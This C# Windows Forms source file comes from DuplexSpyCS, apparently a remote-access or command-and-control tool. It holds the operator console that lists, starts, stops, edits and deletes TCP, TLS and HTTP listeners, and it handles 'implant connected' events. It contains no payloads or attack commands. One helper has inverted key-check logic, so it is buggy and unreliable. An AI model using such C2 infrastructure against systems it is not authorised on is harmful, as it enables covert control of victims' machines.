using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace DuplexSpyCS
{
    public partial class frmListener : Form
    {
        private clsSqlConn m_sqlConn { get; set; }
        private frmMain m_frmMain { get; set; }
        private Dictionary<string, clsListener> m_dicListener => m_frmMain.m_dicListener;

        public frmListener(clsSqlConn sqlConn, frmMain fMain)
        {
            InitializeComponent();

            m_sqlConn = sqlConn;
            m_frmMain = fMain;
        }

        private stListenerConfig fnGetItemTag(ListViewItem item) => (stListenerConfig)item.Tag;
        private clsListener fnGetListenerFromItem(ListViewItem item) => m_dicListener.ContainsKey(item.Text) ? null : m_dicListener[item.Text];

        public void fnLoadListener()
        {
            void fnAddListener(stListenerConfig config)
            {
                clsListener listener = new clsListener();
                switch (config.enProtocol)
                {
                    case enListenerProtocol.TCP:
                        listener = new clsTcpListener(config.szName, config.nPort, config.szDescription);
                        break;
                    case enListenerProtocol.TLS:
                        listener = new clsTlsListener(config.szName, config.nPort, config.szDescription, config.szCertPath, config.szCertPassword);
                        break;
                    case enListenerProtocol.HTTP:
                        listener = new clsHttpListener(config.szName, config.nPort, config.szDescription);
                        break;
                    default:

                        break;
                }

                listener.ReceivedDecoded += m_frmMain.fnReceived;
                listener.Disconencted += m_frmMain.fnDisconnected;
                listener.ImplantConnected += m_frmMain.fnImplantConnected;

                if (!m_frmMain.m_dicListener.ContainsKey(config.szName))
                {
                    m_frmMain.m_dicListener.Add(config.szName, listener);
                }
            }

            //Clear listview items.
            listView1.Items.Clear();

            //Select listener config from database.
            if (m_dicListener.Keys.Count == 0)
            {
                var lListener = m_sqlConn.fnlsGetAllListener();
                foreach (var config in lListener)
                {
                    try
                    {
                        ListViewItem item = new ListViewItem(config.szName);
                        item.SubItems.Add(config.enProtocol.ToString());
                        item.SubItems.Add(config.nPort.ToString());
                        item.SubItems.Add(config.szDescription);
                        item.SubItems.Add(config.dtCreationDate.ToString("yyyy-MM-dd HH:mm", CultureInfo.InvariantCulture));
                        item.SubItems.Add("Closed");

                        item.Tag = config;
                        item.ImageKey = "no";
                        item.ToolTipText = "Unavailable";

                        listView1.Items.Add(item);

                        fnAddListener(config);

                        item.ImageKey = "ok";
                        item.ToolTipText = "Available";
                    }
                    catch (InvalidOperationException)
                    {

                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            else
            {
                var ls = m_sqlConn.fnlsGetAllListener();
                foreach (var config in ls)
                {
                    try
                    {
                        ListViewItem item = new ListViewItem(config.szName);
                        item.SubItems.Add(config.enProtocol.ToString());
                        item.SubItems.Add(config.nPort.ToString());
                        item.SubItems.Add(config.szDescription);
                        item.SubItems.Add(config.dtCreationDate.ToString("yyyy-MM-dd HH:mm", CultureInfo.InvariantCulture));

                        item.Tag = config;

                        item.ImageKey = "no";
                        item.ToolTipText = "Unavailable";

                        clsListener listener = null;
                        m_dicListener.TryGetValue(config.szName, out listener);
                        if (listener == null)
                        {
                            fnAddListener(config);
                        }

                        item.SubItems.Add((listener != null && listener.m_bIslistening) ? "Opened" : "Closed");

                        item.ImageKey = "ok";
                        item.ToolTipText = "Available";

                        listView1.Items.Add(item);
                    }
                    catch (InvalidOperationException)
                    {

                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }

            //Display listener count.
            toolStripStatusLabel1.Text = $"Listener[{listView1.Items.Count}]";
        }

        void fnStartAll()
        {
            foreach (string szName in m_dicListener.Keys)
            {
                var listener = m_dicListener[szName];

                if (!listener.m_bIslistening)
                    listener.fnStart();

                try
                {
                    Invoke(new Action(() =>
                    {
                        ListViewItem item = listView1.FindItemWithText(szName);
                        item.SubItems[5].Text = "Opened";

                    }));
                }
                catch (InvalidOperationException)
                {

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        void fnStopAll()
        {
            foreach (string szName in m_dicListener.Keys)
            {
                var listener = m_dicListener[szName];

                if (listener.m_bIslistening)
                    listener.fnStop();

                Invoke(new Action(() =>
                {
                    ListViewItem item = listView1.FindItemWithText(szName);
                    item.SubItems[5].Text = "Closed";
                }));
            }
        }

        void fnSetup()
        {
            fnLoadListener();
            timer1.Start();
        }

        private void frmListener_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Refresh
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            fnLoadListener();
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            frmListenerEdit f = new frmListenerEdit(this, new stListenerConfig(), m_sqlConn);

            f.ShowDialog();
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            var lConfig = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetItemTag(x)).ToList();
            if (lConfig.Count == 0)
                return;

            frmListenerEdit f = new frmListenerEdit(this, lConfig.First(), m_sqlConn);

            f.ShowDialog();
        }

        //Start
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            if (listView1.Items.Count == 0)
            {
                MessageBox.Show("You don't have any listener.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            Task.Run(() => fnStartAll());
        }

        //Stop
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            if (listView1.Items.Count == 0)
            {
                MessageBox.Show("You don't have any listener.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            Task.Run(() => fnStopAll());
        }

        //Refresh
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            fnLoadListener();
        }

        //New
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            frmListenerEdit f = new frmListenerEdit(this, new stListenerConfig(), m_sqlConn);

            f.ShowDialog();
        }

        //Edit
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            var lConfig = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetItemTag(x)).ToList();
            if (lConfig.Count == 0)
                return;

            foreach (var config in lConfig)
            {
                frmListenerEdit f = new frmListenerEdit(this, config, m_sqlConn);

                f.ShowDialog();

                fnLoadListener();
            }
        }

        //Delete
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                if (string.Equals(item.ImageKey, "no"))
                {
                    if (!m_sqlConn.fnbDeleteListener(item.Text))
                    {
                        MessageBox.Show("Cannot delete listener: " + item.Text, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }

                    continue;
                }

                var listener = m_dicListener[item.Text];
                if (listener.m_bIslistening)
                    listener.fnStop();

                if (!m_sqlConn.fnbDeleteListener(item.Text))
                {
                    MessageBox.Show("Cannot delete listener: " + item.Text, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                m_dicListener.Remove(item.Text);
            }

            fnLoadListener();
        }

        //Start selected
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                var listener = fnGetListenerFromItem(item);

                if (!listener.m_bIslistening)
                    listener.fnStart();
            }
        }
        //Start All
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            fnStartAll();
        }

        //Stop selected
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                var listener = fnGetListenerFromItem(item);

                if (listener.m_bIslistening)
                    listener.fnStop();
            }
        }
        //Stop All
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            fnStopAll();
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.A)
                {
                    foreach (ListViewItem item in listView1.Items)
                        item.Selected = true;
                }
            }
            else
            {
                if (e.KeyCode == Keys.F5)
                {
                    fnLoadListener();
                }
                else if (e.KeyCode == Keys.Delete)
                {
                    foreach (ListViewItem item in listView1.SelectedItems)
                    {
                        var listener = m_dicListener[item.Text];
                        if (listener.m_bIslistening)
                            listener.fnStop();

                        if (!m_sqlConn.fnbDeleteListener(item.Text))
                        {
                            MessageBox.Show("Cannot delete listener: " + item.Text, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }

                        m_dicListener.Remove(item.Text);
                    }

                    fnLoadListener();
                }
                else if (e.KeyCode == Keys.Enter || e.KeyCode == Keys.Space)
                {
                    var lConfig = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetItemTag(x)).ToList();
                    if (lConfig.Count == 0)
                        return;

                    frmListenerEdit f = new frmListenerEdit(this, lConfig.First(), m_sqlConn);

                    f.ShowDialog();
                }
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            List<clsListener> ls = m_dicListener.Values.ToList();
            int nTCP = ls.Where(x => x.m_protocol == enListenerProtocol.TCP).ToList().Count;
            int nTLS = ls.Where(x => x.m_protocol == enListenerProtocol.TLS).ToList().Count;
            int nHTTP = ls.Where(x => x.m_protocol == enListenerProtocol.HTTP).ToList().Count;

            Text = $"Listener | TCP[{nTCP}], TLS[{nTLS}], HTTP[{nHTTP}]";
            toolStripStatusLabel1.Text = $"Listener[{listView1.Items.Count}]";
        }

        private void frmListener_FormClosed(object sender, FormClosedEventArgs e)
        {
            timer1.Stop();
        }

        private void toolStripButton5_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Listener\\Listener").Show();
        }

        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Selected = string.Equals(item.ImageKey, "ok");
        }

        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Selected = string.Equals(item.ImageKey, "no");
        }
    }
}
